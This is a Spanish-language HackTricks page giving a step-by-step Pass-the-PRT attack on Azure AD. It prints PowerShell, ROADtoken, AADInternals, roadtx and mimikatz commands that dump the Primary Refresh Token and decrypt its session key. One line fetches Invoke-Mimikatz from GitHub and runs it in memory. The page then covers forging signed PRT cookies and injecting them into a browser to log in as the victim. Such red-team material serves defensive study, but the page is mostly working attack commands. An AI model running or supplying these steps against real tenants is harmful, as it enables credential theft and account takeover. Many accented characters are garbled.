# Az - Pasar el PRT

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Qu칠 es un PRT

{% content-ref url="az-primary-refresh-token-prt.md" %}
[az-primary-refresh-token-prt.md](az-primary-refresh-token-prt.md)
{% endcontent-ref %}

### Verifica si tienes un PRT
```
Dsregcmd.exe /status
```
En la secci칩n de Estado de SSO, deber칤as ver **`AzureAdPrt`** establecido en **YES**.

<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

En la misma salida tambi칠n puedes ver si el **dispositivo est치 unido a Azure** (en el campo `AzureAdJoined`):

<figure><img src="../../../.gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

## Cookie PRT

La cookie PRT en realidad se llama **`x-ms-RefreshTokenCredential`** y es un JSON Web Token (JWT). Un JWT contiene **3 partes**: el **encabezado**, **carga 칰til** y **firma**, divididos por un `.` y todos codificados en base64 seguro para URL. Una cookie PRT t칤pica contiene el siguiente encabezado y cuerpo:
```json
{
"alg": "HS256",
"ctx": "oYKjPJyCZN92Vtigt/f8YlVYCLoMu383"
}
{
"refresh_token": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAZ18nQkT-eD6Hqt7sf5QY0iWPSssZOto]<cut>VhcDew7XCHAVmCutIod8bae4YFj8o2OOEl6JX-HIC9ofOG-1IOyJegQBPce1WS-ckcO1gIOpKy-m-JY8VN8xY93kmj8GBKiT8IAA",
"is_primary": "true",
"request_nonce": "AQABAAAAAAAGV_bv21oQQ4ROqh0_1-tAPrlbf_TrEVJRMW2Cr7cJvYKDh2XsByis2eCF9iBHNqJJVzYR_boX8VfBpZpeIV078IE4QY0pIBtCcr90eyah5yAA"
}
```
El **`refresh_token`** contiene el **PRT** real. Est치 cifrado usando una clave que es gestionada por Azure AD, por lo que no podemos ver su contenido ni descifrarlo. El **`is_primary`** indica que **contiene el token de actualizaci칩n primario**. El `request_nonce` se pasa desde la p치gina `logon.microsoftonline.com` para asegurarse de que la cookie solo se pueda usar para esa sesi칩n de inicio de sesi칩n.

### Flujo de la cookie PRT usando TPM

El proceso **LSASS** enviar치 al TPM el **contexto KDF**, y el TPM usar치 la **clave de sesi칩n** (obtenida cuando el dispositivo se registr칩 en AzureAD y almacenada en el TPM) y el contexto anterior para **derivar** una **clave,** y esta **clave derivada** se utiliza para **firmar la cookie PRT (JWT).**

El **contexto KDF es** un nonce de AzureAD y el PRT creando un **JWT** mezclado con un **contexto** (bytes aleatorios).

Por lo tanto, incluso si el PTR no se puede extraer porque est치 ubicado dentro del TPM, es posible abusar de LSASS para **solicitar claves derivadas de nuevos contextos y usar las claves generadas para firmar Cookies**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Escenarios de abuso de PRT

Como **usuario regular** es posible **solicitar el uso de PRT** pidiendo a LSASS datos de SSO.\
Esto se puede hacer como **aplicaciones nativas** que solicitan tokens del **Web Account Manager** (intermediario de tokens). WAM pasa la solicitud a **LSASS**, que pide tokens usando la afirmaci칩n PRT firmada. O se puede hacer con flujos basados en **navegador (web)** donde una **cookie PRT** se usa como **encabezado** para autenticar solicitudes a las p치ginas de inicio de sesi칩n de Azure AS.

Como **SYSTEM** podr칤as **robar el PRT si no est치 protegido** por TPM o **interactuar con las claves PRT en LSASS** usando APIs criptogr치ficas.

## Ejemplos de ataques Pass-the-PRT

### Ataque - ROADtoken

Para m치s informaci칩n sobre esta forma [**consulta este post**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). ROADtoken ejecutar치 **`BrowserCore.exe`** desde el directorio correcto y lo usar치 para **obtener una cookie PRT**. Esta cookie puede ser usada luego con ROADtools para autenticar y **obtener un token de actualizaci칩n persistente**.

Para generar una cookie PRT v치lida lo primero que necesitas es un nonce.\
Puedes obtener esto con:
```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
"URI"     = $URL
"Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```
O utilizando [**roadrecon**](https://github.com/dirkjanm/ROADtools):
```powershell
roadrecon auth prt-init
```
Entonces puedes usar [**roadtoken**](https://github.com/dirkjanm/ROADtoken) para obtener un nuevo PRT (ejecutar en la herramienta desde un proceso del usuario a atacar):
```powershell
.\ROADtoken.exe <nonce>
```
Como una l칤nea:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Luego puedes usar la **cookie generada** para **generar tokens** e **iniciar sesi칩n** usando Azure AD **Graph** o Microsoft Graph:
```powershell
# Generate
roadrecon auth --prt-cookie <prt_cookie>

# Connect
Connect-AzureAD --AadAccessToken <token> --AccountId <acc_ind>
```
### Ataque - Usando roadrecon



### Ataque - Usando AADInternals y PTR filtrado

`Get-AADIntUserPRTToken` **obtiene el token PRT del usuario** desde el ordenador unido a Azure AD o h칤brido. Utiliza `BrowserCore.exe` para obtener el token PRT.
```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```
O si tienes los valores de Mimikatz tambi칠n puedes usar AADInternals para generar un token:
```powershell
# Mimikat "PRT" value
$MimikatzPRT="MC5BWU..."

# Add padding
while($MimikatzPrt.Length % 4) {$MimikatzPrt += "="}

# Decode
$PRT=[text.encoding]::UTF8.GetString([convert]::FromBase64String($MimikatzPRT))

# Mimikatz "Clear key" value
$MimikatzClearKey="37c5ecdfeab49139288d8e7b0732a5c43fac53d3d36ca5629babf4ba5f1562f0"

# Convert to Byte array and B64 encode
$SKey = [convert]::ToBase64String( [byte[]] ($MimikatzClearKey -replace '..', '0x$&,' -split ',' -ne ''))

# Generate PRTToken with Nonce
$prtToken = New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey -GetNonce
$prtToken
## You can already use this token ac cookie in the browser

# Get access token from prtToken
$AT = Get-AADIntAccessTokenForAzureCoreManagement -PRTToken $prtToken

# Verify access and connect with Az. You can see account id in mimikatz prt output
Connect-AzAccount -AccessToken $AT -TenantID <tenant-id> -AccountId <acc-id>
```
Ir a [https://login.microsoftonline.com](https://login.microsoftonline.com), eliminar todas las cookies de login.microsoftonline.com e introducir una nueva cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
Luego ve a [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
El resto deber칤a ser la configuraci칩n predeterminada. Aseg칰rate de poder actualizar la p치gina y que la cookie no desaparezca, si lo hace, es posible que hayas cometido un error y tengas que pasar por el proceso nuevamente. Si no es as칤, deber칤as estar bien.
{% endhint %}

### Ataque - Mimikatz

#### Pasos

1. **Extrae** el **PRT de LSASS** y guarda esto para m치s tarde.
2. **Extrae** la **Clave de Sesi칩n**. Si recuerdas, esta es emitida y luego reencriptada por el dispositivo local, por lo que necesitamos **desencriptarla usando una masterkey de DPAPI**. Para m치s informaci칩n sobre DPAPI, consulta este enlace de [**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) o el ataque [**Pass-the-cookie**](az-pass-the-cookie.md).
3. Usando la Clave de Sesi칩n desencriptada, obtendremos la clave derivada para el PRT y el contexto. Esto es necesario para **crear nuestra cookie PRT**. La clave derivada es lo que se utiliza para firmar el JWT de la cookie. Dirk-jan hizo un gran trabajo explicando este proceso [aqu칤](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

{% hint style="danger" %}
Ten en cuenta que si el PRT est치 dentro del TPM y no dentro de `lsass`, **mimikatz no podr치 extraerlo**.\
Sin embargo, ser치 posible **obtener una clave de una clave derivada de un contexto** del TPM y usarla para **firmar una cookie (consulta la opci칩n 3).**
{% endhint %}

Puedes encontrar una **explicaci칩n detallada del proceso realizado** para extraer estos detalles aqu칤: [**https://dirkjanm.io/digging-further-into-the-primary-refresh-token/**](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)

{% hint style="warning" %}
Esto no funcionar치 exactamente despu칠s de las correcciones de agosto de 2021 para obtener tokens PRT de otros usuarios, ya que solo el usuario puede obtener su PRT (un administrador local no puede acceder a los PRT de otros usuarios), pero puede acceder al suyo.
{% endhint %}

Puedes usar **mimikatz** para extraer el PRT:
```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```
**Copia** la parte etiquetada como **Prt** y gu치rdala.\
Extrae tambi칠n la clave de sesi칩n (el valor de **`KeyValue`** del campo **`ProofOfPossesionKey`**), que puedes ver resaltado a continuaci칩n. Esta est치 cifrada y necesitaremos usar nuestras masterkeys de DPAPI para descifrarla.

{% hint style="info" %}
Si no ves ning칰n dato de PRT, podr칤a ser que **no tengas ning칰n PRT** porque tu dispositivo no est치 unido a Azure AD o podr칤a ser que est칠s **ejecutando una versi칩n antigua** de Windows 10.
{% endhint %}

Para **descifrar** la clave de sesi칩n necesitas **elevar** tus privilegios a **SYSTEM** para ejecutar bajo el contexto del ordenador y poder usar la **masterkey de DPAPI para descifrarla**. Puedes usar los siguientes comandos para hacerlo:
```
token::elevate
dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```
#### Opci칩n 1 - Mimikatz Completo

* Ahora quieres copiar tanto el valor de Context:

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

* Como el valor de la clave derivada:

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

* Finalmente puedes usar toda esta informaci칩n para **generar cookies PRT**:
```bash
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```
<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

* Vaya a [https://login.microsoftonline.com](https://login.microsoftonline.com), elimine todas las cookies de login.microsoftonline.com e introduzca una nueva cookie.
```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
Path: /
HttpOnly: Set to True (checked)
```
* Luego ve a [https://portal.azure.com](https://portal.azure.com)

{% hint style="danger" %}
El resto debe ser la configuraci칩n predeterminada. Aseg칰rate de poder actualizar la p치gina y que la cookie no desaparezca, si lo hace, es posible que hayas cometido un error y tengas que repetir el proceso. Si no desaparece, deber칤as estar listo.
{% endhint %}

#### Opci칩n 2 - roadrecon usando PTR

* Renueva el PRT primero, lo que lo guardar치 en `roadtx.prt`:

{% code overflow="wrap" %}
```bash
roadtx prt -a renew --prt <PRT From mimikatz> --prt-sessionkey <clear key from mimikatz>
```
{% endcode %}

* Ahora podemos **solicitar tokens** utilizando el navegador interactivo con `roadtx browserprtauth`. Si utilizamos el comando `roadtx describe`, vemos que el token de acceso incluye una reclamaci칩n de MFA porque el PRT que utilic칠 en este caso tambi칠n ten칤a una reclamaci칩n de MFA.
```bash
roadtx browserprtauth
roadtx describe < .roadtools_auth
```
<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Opci칩n 3 - roadrecon usando claves derivadas

Teniendo el contexto y la clave derivada volcada por mimikatz, es posible usar roadrecon para generar una nueva cookie firmada con:

{% code overflow="wrap" %}
```bash
roadrecon auth --prt-cookie <cookie> --prt-context <context> --derives-key <derived key>
```
## Referencias

* [https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/)
* [https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
* [https://www.youtube.com/watch?v=x609c-MUZ\_g](https://www.youtube.com/watch?v=x609c-MUZ\_g)

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤gueme** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
